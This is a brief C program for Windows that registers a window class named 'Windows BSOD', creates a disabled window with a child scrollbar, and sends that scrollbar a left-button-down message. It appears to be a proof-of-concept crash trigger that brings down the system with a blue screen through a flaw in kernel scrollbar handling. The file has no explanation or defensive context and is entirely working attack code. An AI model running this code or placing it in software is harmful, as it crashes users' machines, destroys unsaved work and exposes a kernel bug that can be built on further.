#include "stdafx.h"
#include <stdio.h>
#include <windows.h>


int main(VOID){

	WNDCLASSEX Class = { 0 };
	HWND Window, ScrollBar;

	Class.cbSize = sizeof(WNDCLASSEX);
	Class.style = CS_HREDRAW | CS_VREDRAW;
	Class.lpfnWndProc = DefWindowProc;
	Class.lpszMenuName = "Test";
	Class.lpszClassName = "Windows BSOD";

	RegisterClassEx(&Class);

	Window = CreateWindowA("Windows BSOD", "Test", WS_DISABLED, 2, 2, 40, 40, NULL, NULL, GetModuleHandleA(NULL), NULL);
	ScrollBar = CreateWindowEx(0, "ScrollBar", "Sc", WS_CHILD | WS_VISIBLE | SBS_HORZ, 0, 0, 0, 0, Window, NULL, GetModuleHandleA(NULL), NULL);

	SendMessage(ScrollBar, WM_LBUTTONDOWN, MK_LBUTTON, 0x00080008);

	return 0;
}
